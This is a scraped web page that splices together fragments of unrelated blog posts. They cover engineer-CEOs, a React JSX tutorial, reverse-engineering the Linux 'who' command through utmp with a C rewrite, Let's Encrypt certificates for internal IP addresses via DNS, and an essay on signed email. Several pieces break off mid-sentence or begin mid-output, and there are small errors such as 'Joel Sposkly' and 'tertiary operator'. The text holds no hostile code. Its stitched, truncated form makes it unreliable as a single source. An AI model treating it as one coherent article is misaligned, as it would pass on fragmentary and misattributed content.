      <p>I recently read a somehow controversial <a href="https://iism.org/article/why-are-ceos-failing-software-engineers-56">article</a> on why CEOs are failing software engineers. In the article, software management theorist <a href="https://twitter.com/GeneTBond">Gene Bond</a> argues that since business-educated CEOs only learn about financial and business management, they can't understand the creative management necessary to discover and realise new works of value.</p><blockquote>"<em>New value is a function of failure, not success; and, much of software engineering is about discovering new value. So, in effect, nearly everything [they] are taught as a business major or leader is seemingly incompatible with software engineering.</em>"</blockquote><p>But what if CEOs were former software engineers? Would they still fail the software engineers they lead? Data seems to show otherwise when you know that eight of the ten <a href="https://fxssi.com/most-valuable-tech-companies">most valuable technology companies</a> have <strong>CEOs who also are engineers</strong>. Jeff Bezos, the richest man in the world, was exposed to tech and coding at a <a href="https://twitter.com/JeffBezos/status/1058012110947373057?s=20">young age</a>. Bill Gates, the second richest, fell in love with programming at <a href="https://www.gatesnotes.com/About-Bill-Gates/Early-Days-as-a-Computer-Programmer">13 years old</a>, and Mark Zuckerberg, famously kept coding Facebook while being CEO for years. Still, the majority of software engineers think they can only become CTO and have little interest in business.</p><h3 id="top-performing-ceos-have-engineering-degrees"><strong>Top-performing CEOs have engineering degrees</strong></h3><p>Every year since 2014, the Harvard Business Review has published an <a href="https://hbr.org/2019/11/the-ceo-100-2019-edition#the-best-performing-ceos-in-the-world-2019">annual ranking</a> of the best-performing CEOs in the world and, for the past three years, there have been <strong>more CEOs with engineering degrees than MBAs</strong>, including this year's number one, NVIDIA CEO Jensen Huang. One likely explanation for this trend is the increase of technology CEOs on the list, as the industry has seen exponential growth in recent years. But maybe there's something else.</p><p>First of all, software engineers know how to set up the right environment for fellow developers because, well, they've been there. They know what developers <a href="https://www.joelonsoftware.com/2006/09/07/a-field-guide-to-developers/">look for in a job</a>. It's not surprising that <strong>twelve out of the twenty tech CEOs most favoured by their </strong><a href="https://www.glassdoor.com/Award/Top-CEOs-LST_KQ0,8.htm"><strong>employees</strong></a><strong> have an engineering background</strong> or coded at some point in their careers. As Stack Overflow and Trello founder Joel Sposkly <a href="https://www.joelonsoftware.com/2005/07/25/hitting-the-high-notes/">puts it</a>: "<em>building the company where the best software developers in the world would want to work [leads] to profits as naturally as chocolate leads to chubbiness or cartoon sex in video games leads to gangland-style shooting sprees</em>". After all, he did build two multi-million companies that considerably impacted the software ecosystem.</p><figure><img src="https://lh3.googleusercontent.com/oPXEuhoN05pnwuxbStZyMOftjkpqzRkpZdIxi2KImveOn3p8CL0VOEr7OGcuXQjFr0_MsfHaGx4QJ9ps3JSHJd8TXpv7dSUypZTTqf0jURKiGppNFiGi4aXfiLGbiJ9xBZAa6UwD" alt=""><figcaption>Joel Spolsky’s formula on how to build profitable software companies</figcaption></figure><p>I also believe that having a software engineering mindset, even if self-taught, allows CEOs to manage their companies very differently than financially focused peers.</p><h3 id="approaching-business-processes-like-programming-tasks"><strong>Approaching business processes like programming tasks</strong></h3><p>While Microsoft valuation hardly moved during Steve Ballmer's fourteen years tenure as CEO, it grew over 200 % since Satya Nadella took over in 2014. The difference? Steve Ballmer was a sales-oriented business school drop-out, while Nadella is a former software engineer turned executive.<br></p><figure><img src="https://lh6.googleusercontent.com/SCzxw685G5KsYSWFfNKU1WiU6J7yXXk1nZ-ZBMh-LpSe4gqKLKHwrLT6KCWZJl9bI2E7QHnssM1gCdMRRDVAuabgxYCNn9lQ9xLnbkSNTJ7vgMIhDM7sJecme7mGO_Wqhgxdatg4" alt=""><figcaption>Microsoft stock price under Satya Nadella - CB Insights<span>‌‌</span></figcaption></figure><p>So what does Nadella, and other engineers-turned-CEOs have in common? Well, suppose we take aside the ability to understand technology and have a long-term vision about it. In that case, I believe one of their key attributes is the ability to <strong>approach business processes like programming tasks</strong>.</p><p>Do you know what programmatic marketing, growth hacking and the lean startup have in common? They're all business methodologies that were created by engineers. They leverage <strong>logic and processes</strong> instead of intuition; they're <strong>data-driven</strong> and promote <strong>iterative experimentation</strong>. And, when you go beyond the buzzwords and watch the results, they're behind the wild success of tech companies like Dropbox and Slack (whose CEOs are, by the way, former developers).</p><p>Another trait of software engineers is their inclination to <strong>automate recurring and tedious tasks</strong>. As Bill Gates is known to say, "<em>I always choose a lazy person to do a hard job, because a lazy person will find an easy way to do it.</em>" And software engineers are known to be lazy. So, as CEOs, they're more likely to look for scalable solutions through automation, rather than merely hiring more human beings. Some CEOs take this thinking to another level like GitLab CEO Sid Sijbrandij, who started the company's famous <a href="https://about.gitlab.com/handbook/">handbook</a> because he didn't want to repeat himself for every batch of new hires.</p><p>What's even more interesting is when software engineers become CEOs of non-software companies. In this case, they run their firm like a software company, <strong>making software the cornerstone of their strategy</strong>, like Elon Musk with Tesla. One key component of electric automaker Tesla's success, as <a href="https://hbr.org/2020/02/lessons-from-teslas-approach-to-innovation">spotted</a> by Nathan Furr and Jeff Dyer, is that "<em>it introduced a new hardware and software architecture. For example, a Tesla has more software than the average vehicle and it is integrated around a single central software architecture. Although most gas-powered cars have software too, they typically have less software and operate on a different architecture making it more challenging to imitate Tesla's ability to update software and optimise vehicle performance.</em></p><p>Last but not least, they understand like Jeff Bezos that "<em>failure and invention are inseparable twins.</em>" In his famous <a href="https://www.sec.gov/Archives/edgar/data/1018724/000119312516530910/d168744dex991.htm">letters to shareholders</a>, Bezos often shares that what makes Amazon successful is their ability to accept the failed experiments necessary to get to invention.</p><blockquote>“<em>Outsized returns often come from betting against conventional wisdom, and conventional wisdom is usually right. Given a ten percent chance of a 100 times payoff, you should take that bet every time. But you’re still going to be wrong nine times out of ten [...] In business, every once in a while, when you step up to the plate, you can score 1,000 runs.</em>”</blockquote><h3 id="why-so-few-software-engineers-want-to-become-ceos"><strong>Why so few software engineers want to become CEOs</strong></h3><p>So if software engineers can become excellent CEOs, even in non-tech businesses, why so few of them make it to the top? According to a 2019 Forbes <a href="https://www.forbes.com/sites/kimberlywhitler/2019/10/05/new-ceo-study-the-undergraduate-degrees-and-majors-of-fortune-100-ceos/#623b360e4130">study</a>, still, 64% of F100 CEOs had a business-related undergraduate degree. I don't think it's just about software engineers' dislike for business. I believe it's also about how few of them consider the CEO position as a career choice. They're always told that if they're interested in management, the highest possible job is CTO.

<h2 id="basic-javascript-rendered-hello-world">Basic JavaScript-rendered Hello World</h2>
<p>Let's see how to render Hello World using basic javascript.</p>
<p>My HTML contains a single <code>div</code> with <code>id</code> as <code>root</code></p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>'root'</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, I want to add <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code> to that root div.</p>
<p>We can do that using javascript's document API. Let's see how</p>
<pre><code>
<span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)


<span>const</span> divElement = <span>document</span>.createElement(<span>'div'</span>)
divElement.textContent = <span>'Hello World'</span>
divElement.className = <span>'container'</span>


rootElement.append(divElement)
</code></pre>
<p>What we are doing here is very simple.</p>
<ol>
<li>Get a reference to the actual DOM root element</li>
<li>Create a new div element using <code>document.createElement</code> and then set its class and textContent</li>
<li>Append this newly created element to the root div element.</li>
</ol>
<p>This produces the following HTML markup.</p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>'root'</span>&gt;</span>
    <span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<h2 id="intro-to-raw-react-apis">Intro to raw React APIs</h2>
<p>Now let's try to use React's raw APIs to create markup that we need instead of (vanilla) javascript.</p>
<p>We need two important APIs to achieve our task. In vanilla javascript. they are:</p>
<pre><code><span>document</span>.createElement()
rootElement.append(domElement)
</code></pre>
<p>The React's equivalent of these two APIs are:</p>
<pre><code>React.createElement()
ReactDOM.render(reactElement, rootElement)
</code></pre>
<p>Let's see <code>React.createElement()</code> in more detail.</p>
<h3 id="reactcreateelement">React.createElement()</h3>
<p>This accepts three parameters</p>
<ol>
<li>Component or Tag to use to create the element</li>
<li>Props for the component</li>
<li>Children</li>
</ol>
<p>The API looks like <code>React.createElement(component, props, ...children)</code></p>
<p>So, to create an element like <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code>, you would do </p>
<pre><code>React.createElement(<span>'div'</span>, { className: <span>'container'</span> }, <span>'Hello World'</span>)
</code></pre>
<p>Our HTML will have</p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>"root"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, to append <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code> to the root element using React, we do:</p>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> divElement = React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, <span>'Hello World'</span>)

ReactDOM.render(divElement, rootElement)
</code></pre>
<p>Can you see how similar the React's API is to the normal vanilla js document API? </p>
<p>Note that, you can even create nested elements using this.</p>
<p>For example, let's try to create the following markup.</p>
<pre><code><span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>To create the above markup</p>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> helloElement = React.createElement(<span>'span'</span>, <span>null</span>, <span>'Hello'</span>)
<span>const</span> worldElement = React.createElement(<span>'span'</span>, <span>null</span>, <span>'World'</span>)
<span>const</span> divElement = React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, helloElement, worldElement)

ReactDOM.render(divElement, rootElement)
</code></pre>
<p>You can even use a special <code>children</code> prop to add the children like the following</p>
<pre><code>React.createElement(<span>'div'</span>, {className: <span>'container'</span>, children: [helloElement, worldElement]})
</code></pre>
<p>The above code is same as the below code</p>
<pre><code>React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, helloElement, worldElement)
</code></pre><h2 id="using-jsx">Using JSX</h2>
<p>If you have already been using React or saw the React code any time, you most probably would not have seen <code>React.createElement</code> being used. Instead, you might have seen some code that looks similar to HTML. Let's see what it is.</p>
<p>JSX is HTML-like syntactic sugar on top of raw React APIs. </p>
<p>Let's see an example.</p>
<pre><code><span>const</span> divElement = <span><span>&lt;<span>div</span> <span>id</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>The above code is equivalent to </p>
<pre><code><span>const</span> divElement = React.createElement(<span>'div'</span>, {id: <span>'container'</span>}, <span>'Hello World'</span>)
</code></pre>
<p>But JSX is not a valid javascript code, so we use a compiler called <code>Babel</code> to convert JSX code to its corresponding <code>React.createElement</code> code.</p>
<p>Now, let's see how easy it is to create the following markup using JSX.</p>
<pre><code><span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span><span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span><span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>

ReactDOM.render(divElement, rootElement)</span>
</code></pre>
<p>Note that there are some subtle differences between JSX and HTML. </p>
<p>For example, in HTML to add class to an element, we add it like <code>class='container'</code>, whereas in JSX, we need to write <code>className='container'</code>. </p>
<p>There are some other differences when using JSX which I will explain later in the post.</p>
<h2 id="interpolation-in-jsx">Interpolation in JSX</h2>
<p>Since JSX is written in javascript itself, there are some very interesting things which you can do. One of those is using JSX interpolation. It basically gives us the ability to use javascript inside of JSX. Whenever you do interpolation, you would surround it with <code>{</code> and <code>}</code>. This tells the Babel compiler that interpolation is being used here.</p>
<p>For example, take the following code</p>
<pre><code><span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>Now, you want the class name and text content to be dynamic, you can do something like</p>
<pre><code><span>const</span> divClassName = <span>'container'</span>
<span>const</span> divTextContent = <span>'Hello World'</span>

<span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>{divClassName}</span>&gt;</span>{divTextContent}<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>Can you see the flexibility that interpolation gives us? </p>
<h3 id="conditionals-and-loops">Conditionals and Loops</h3>
<p>You can even add conditionals and loops in JSX</p>
<pre><code>{ condition ? <span><span>&lt;<span>div</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span> : <span>&lt;<span>div</span>&gt;</span>Goodbye World<span>&lt;/<span>div</span>&gt;</span> }</span>
</code></pre>
<p>As you can see above, to use conditionals in JSX, you would make use of the tertiary operator.</p>
<pre><code>{items.map((item) =&gt; <span><span>&lt;<span>div</span> <span>key</span>=<span>{item.id}</span>&gt;</span>{item.title}<span>&lt;/<span>div</span>&gt;</span>)</span>}
</code></pre>
<p>To use loops, you will use the <code>map</code> function.</p>
<p>You can even use template literals in JSX like</p>
<pre><code><span>const</span> element = <span><span>&lt;<span>div</span> <span>id</span>=<span>{`item-${itemId}`}</span>&gt;</span>{itemContent}<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>To learn more about JSX, head over to <a target="_blank" href="https://reactjs.org/docs/jsx-in-depth.html">JSX in Depth</a> - React's official docs</p>
<h2 id="creating-custom-components">Creating custom components</h2>
<p>Consider the following JSX code</p>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
  <span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span>
  <span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Goodbye World<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Here you can see the code <code>&lt;div className='message'&gt;&lt;/div&gt;</code> is duplicated at two places.</p>
<p>To avoid duplication, the simplest thing we can do is to create a function and then call it instead.</p>
<pre><code><span><span>function</span> <span>message</span>(<span>text</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{text}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {message('Hello World')}
    {message('Goodbye World')}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Let's refactor this a bit.</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {message({children: 'Hello World'})}
    {message({children: 'Goodbye World'})}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Let's refactor this even more to use React.createElement</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {React.createElement(message, null, 'Hello World')}
    {React.createElement(message, null, 'Goodbye World')}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Previously in all the examples that we have seen, the first argument of React.createElement() is a string like 'span' or 'div'.</p>
<p>But React.createElement also accepts a function that returns something renderable like JSX, some string, number etc.</p>
<p>That's why the above code works.</p>
<p>Now, let's convert the above code to JSX</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>message</span>&gt;</span>Hello World<span>&lt;/<span>message</span>&gt;</span>
    <span>&lt;<span>message</span>&gt;</span>Goodbye World<span>&lt;/<span>message</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>The above code seems to be perfect, right? Actually it's not. The above code will not work as intended. The reason being how babel compiles the JSX code to it's corresponding React.createElement() code.</p>
<p><code>&lt;message /&gt;</code> is compiled by babel to <code>React.createElement('message')</code>. But what we want is <code>React.createElement(message)</code>. In the first case, the first argument is a string, in the second case, it's a function.</p>
<p>For the babel to convert it into what we needed, we have to make the <code>message</code> function name uppercase.</p>
<pre><code><span><span>function</span> <span>Message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>Message</span>&gt;</span>Hello World<span>&lt;/<span>Message</span>&gt;</span>
    <span>&lt;<span>Message</span>&gt;</span>Goodbye World<span>&lt;/<span>Message</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, this <code>&lt;Message&gt;Hello World&lt;/Message&gt;</code> will be compiled to <code>React.createElement(Message, {children: 'Hello World'})</code>, which is exactly what we needed.</p>
<p>Check the below examples to see how Babel compiles each of the JSX formats.</p>
<table>
<thead>
<tr>
<td>JSX</td><td>React.createElement()</td></tr>
</thead>
<tbody>
<tr>
<td><code>&lt;Capitalized /&gt;</code></td><td><code>React.createElement(Capitalized)</code></td></tr>
<tr>
<td><code>&lt;property.access /&gt;</code></td><td><code>React.createElement(property.access)</code></td></tr>
<tr>
<td><code>&lt;Property.Access /&gt;</code></td><td><code>React.createElement(Property.Access)</code></td></tr>
<tr>
<td><code>&lt;Property['Access'] /&gt;</code></td><td><code>SyntaxError</code></td></tr>
<tr>
<td><code>&lt;lowercase /&gt;</code></td><td><code>React.createElement('lowercase')</code></td></tr>
<tr>
<td><code>&lt;kebab-case /&gt;</code></td><td><code>React.createElement('kebab-case')</code></td></tr>
<tr>
<td><code>&lt;Upper-Kebab-Case /&gt;</code></td><td><code>React.createElement('Upper-Kebab-Case')</code></td></tr>
<tr>
<td><code>&lt;Upper_Snake_Case /&gt;</code></td><td><code>React.createElement(Upper_Snake_Case)</code></td></tr>
<tr>
<td><code>&lt;lower_snake_case /&gt;</code></td><td><code>React.createElement('lower_snake_case')</code></td></tr>
</tbody>
</table>
<p>So, we can see that the component name needs to be UpperCamelCased for it to work as intended.</p>
<h3 id="proptypes">PropTypes</h3>
<p>Let's slightly change the previous message component so that it accepts <code>name</code> prop.</p>
<pre><code><span><span>function</span> <span>Message</span>(<span>{name}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Hi, your name is {name}.<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>Message</span> <span>name</span>=<span>'foo'</span> /&gt;</span>
<span>&lt;<span>Message</span> /&gt;</span>
</code></pre>
<p>This produces</p>
<pre><code>Hi, your name <span>is</span> foo.
Hi, your name <span>is</span> .
</code></pre><p>This doesn't look good. Does it? So what if there is a way we can enforce that the name needs to be passed and it needs to be a string.</p>
<p>Luckily, React gives us …</p></div></div>

gauthier pts/1        2020-08-30 15:06 (tmux(1555).%0)
gauthier pts/2        2020-08-30 16:41 (tmux(1555).%6)
gauthier pts/4        2020-08-30 15:57 (tmux(1555).%3)
</code></pre><p>It tells me that I am logged on the “physical” terminal <code>tty2</code> and on three pseudo terminals. Indeed my current session of Gnome Shell is running on <code>tty2</code> and I have 3 <code>tmux</code> windows open.</p><p>But where is it getting those information? Probably from a file as everything is a file with Linux, but let’s check which one and how the data is stored there.</p><h2 id="a-bit-of-reverse-engineering">A bit of reverse engineering</h2><p>In order to see what the <code>who</code> command is doing I could try to find the source code and dig into it. But I found it fun to use <code>strace</code> to check what the process was doing instead. Since we are expecting <code>who</code> to read system files, we can only focus on the <code>open</code> syscalls.</p><pre><code>$ strace who 2&gt;&amp;1 | grep open
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/var/run/utmp", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/etc/localtime", O_RDONLY|O_CLOEXEC) = 3
</code></pre><p>We can quickly filter what is interesting and what is not. The first files two files <code>/etc/ld.so.cache</code>, <code>/usr/lib/libc.so.6</code> are shared libraries loaded by the process, those are interesting us.</p><p>Then <code>/usr/lib/locale/locale-archive</code>, <code>/var/run/utmp</code> and <code>/etc/localtime</code> are opened. Let’s see what those files are storing.</p><p>When exploring this kind of topics, it is always interesting to first search into the man pages before starting browsing the web. The 5th section of the manual is dedicated to “file formats and conventions” and seems a good place to start.</p><h3 id="locale-archive">locale-archive</h3><pre><code>$ man -wK 5 '/usr/lib/locale/locale-archive'
</code></pre><p>Sends us to <code>locale(5)</code> where we can read:</p><pre><code>The  locale  definition file contains all the information that the localedef(1) command needs to convert it into the binary locale data‐base.
</code></pre><p>The page also sends us to <code>locale(7)</code> for more explanation about those informations:</p><pre><code>A  locale is a set of language and cultural rules. These cover aspects such as language for messages, different character sets, lexico‐graphic conventions, and so on. A program needs to be able to determine its locale and act accordingly to be portable to different cultures.
</code></pre><p>So the <code>who</code> command read from this file, probably using the <code>setlocale(3)</code> function, to find out how the information should be formated and displayed.</p><p>We can actually check it:</p><pre><code>$ LC_ALL='fr_FR.utf8' who
gauthier tty2         Sep  2 11:38 (:1)
gauthier pts/1        Sep  2 12:11 (tmux(2445).%0)
gauthier pts/2        Sep  2 12:37 (tmux(2445).%1)
gauthier pts/3        Sep  2 13:04 (tmux(2445).%2)
</code></pre><p>Indeed, the date is is not formated the same way!</p><h3 id="localtime">localtime</h3><pre><code>$ man -wK 5 '/etc/localtime'
</code></pre><p>Sends us to <code>localtime(5)</code> which explains:</p><pre><code>The /etc/localtime file configures the system-wide timezone of the local system that is used by applications for presentation to the user.
</code></pre><p>Probably <code>who</code> uses this file (or uses a function that is using this file) to print timestamps (columns 4 and 5 of <code>who</code>'s output) using the correct timezone configured by the user.</p><h3 id="utmp">utmp</h3><p>Finally comes <code>/var/run/utmp</code>:</p><pre><code>$ man -wK 5 '/var/run/utmp'
/usr/share/man/man5/utmp.5.gz
</code></pre><p>Where we can read:</p><pre><code>The  utmp  file  allows  one to discover information about who is currently using the system.  There may be more users currently using the system, because not all programs use utmp logging.
</code></pre><p>Great! We found where the <code>who</code> command is getting its data. It would be nice to be able to read this file to get those data without using the <code>who</code> command. Unfortunately:</p><pre><code>The file is a sequence of utmp structures, declared as follows in &lt;utmp.h&gt; (note that this is only one of several definitions around; details depend on the version of libc):
</code></pre><p>At this point we understood what the <code>who</code> command is doing: it is reading <code>/var/run/utmp</code>, parsing the content and formating it nicely. Let’s see if we can reproduce this simple behavior.</p><h3 id="my-own-who">My own <code>who</code></h3><p>What we simply need to do is: open <code>/var/run/utmp</code>, read <code>n</code> bytes (where <code>n</code> is the size of the <code>utmp</code> structure), print the info contained in each structure, continue until we reach the end of the file. With a bit of formating, we can even make it look like the original <code>who</code> command.</p><pre><code>#include &lt;utmp.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

int main() {
  // set the right locale to display the information nicely
  setlocale(LC_ALL, "");

  // open the file
  FILE * file= fopen("/var/run/utmp", "rb");

  // just for safety
  if (file == NULL) {
    return 1;
  }

  // initialize the utmp structure
  struct utmp entry;

  // read the entries from the file one by one
  while (fread(&amp;entry, sizeof(struct utmp), 1, file) != 0) {
    if (entry.ut_type != USER_PROCESS)
      continue;

    // format the date (remember who uses the /etc/localtime?)
    char date[80];
    time_t raw_time = entry.ut_tv.tv_sec;
    struct tm *ts = localtime(&amp;raw_time);
    strftime(date, sizeof(date), "%Y-%m-%d %H:%M", ts);

    // print the output for this entry, tries to mock who's output
    printf("%-8s %-12s %s (%s)\n", entry.ut_user, entry.ut_line, date, entry.ut_host);
  }

  fclose(file);
}
</code></pre><pre><code>$ clang -o who who.c
$ ./who
gauthier tty2         2020-08-31 10:02 (tty2)
gauthier pts/1        2020-08-31 10:03 (tmux(2220).%0)
gauthier pts/2        2020-08-31 10:08 (tmux(2220).%1)
gauthier pts/3        2020-08-31 10:33 (tmux(2220).%5)
</code></pre><p>TADA!</p><p>We can also check with <code>strace</code> if the behavior is the same:</p><pre><code>$ strace ./who 2&gt;&amp;1 | grep -e open
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/var/run/utmp", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/localtime", O_RDONLY|O_CLOEXEC) = 4
</code></pre><p>Indeed our program is doing the same as the original <code>who</code>.</p><p>Of course, this only mocks the most basic features of the <code>who</code> command and doesn’t handle any option, like the famous <code>who am i</code> or <code>who mom hates</code>.</p><h3 id="going-further">Going further</h3><p>There is still a lot to say about the <code>who</code> command. We could for example mention the <code>lastlog</code> command and its corresponding file <code>/var/log/wtmp</code>, dig into the <code>utmp</code> structure, or just try to understand what <code>utmp</code> stands for.</p></div></div>]]>

                <div>
                    <p>One of the issues I discovered while playing with microk8s Kubernetes setup locally was that many services and tools like <code>Kubernetes Dashboard</code> uses HTTPS for access and I don't want to use Self-Signed SSL certificates as it would require me installing these certificates in every device I use which would be a pain in the butt. So I was on the journey finding a way to have an SSL Certificate for my internal IP addresses. This article will document my journey of getting automatic SSL certificates for my internal microk8s Kubernetes setup.</p><h2 id="ssl-certificate-for-internal-ip-address">SSL Certificate for internal IP address?</h2><p>My first question was is there a way to get an SSL certificate from Public trusted Certificate Authority after looking at many free services like Let's Encrypt and similar services don't provide certificates to IP addresses, but only to domain names.</p><p>After discovering the issue with no way to get an SSL certificate for internal IP I was looking into other options for my problem. After racking my brains for a few minutes I had a question: Could I create a DNS A record for internal IP and would it work? A quick visit to my DNS control panel adding A record to the local IP address and visiting the domain name and seeing my local IP address served website I was amazed that it worked.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image.png 1000w, https://www.techprowd.com/content/images/2020/09/image.png 1212w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-1.png" alt=""></figure><p>Discovering that I can have a domain name for internal IP working I was surprised now I had curiosity if I will be able to use service like Let's Encrypt to generate an SSL Certificate for this domain name but if I remember correctly the Let's Encrypt requires external access to verify domain name ownership. Hmm, maybe there is a way to verify domain name ownership without external access? After some digging around Let's Encrypt documentation, I found that there many ways to verify domain ownership one of them is DNS plugins which have many DNS providers to automatically verify domains by modifying DNS records using API from those providers. In my case it is DigitalOcean.</p><p>Following <code>certbot-dns-digitalocean</code> <a href="https://certbot-dns-digitalocean.readthedocs.io/en/stable/">documentation</a>I tried to generate a certificate for internal IP but I ran into the issue that default macOS <code>certbot</code> installation from <code>brew install certbot</code> had no <code>certbot-dns-digitalocean</code> plugin available.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>After a quick search online I found that DNS Plugins are not installed by default with <code>certbot</code>. I needed to install <code>certbox-dns-digitalocean</code> plugin using PIP</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Afterward, I was able to generate a certificate without many issues:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Applying SSL certificate to local HTTPS server I was able to get HTTPS valid response from the internal IP address using a domain name</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-5.png" alt=""></figure><p>Now that I know that I can generate &amp; use an SSL certificate for internal IP address just by using a domain name.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>All forms of signing email are generally solving the wrong problem (a thesis)</h2>

	<p><small>August 30, 2020</small></p>
</div><div><p>Modern email is full of forms of signed email. Personally signed
email is the old fashioned approach (and wrong), but modern email
on the Internet is laced with things like <a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DKIM</a>, which
have the sending system sign it to identify at least who sent it.
Unfortunately, the more I think about it, the more I feel that
signed email is generally solving the wrong problem (and if it's
solving the right one, we won't like that solution in the long run).</p>

<p>A while ago I wrote about <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/EmailVsModernProtocols">why email often isn't as good as modern
protocols</a>, which is because it's what I
described as an <em>anonymous push</em> protocol. An anonymous push protocol
necessarily enables spam since it allows anyone to send you things.
Describing email as 'anonymous push' makes it sound like the anonymity
is the problem, which would make various forms of signing the
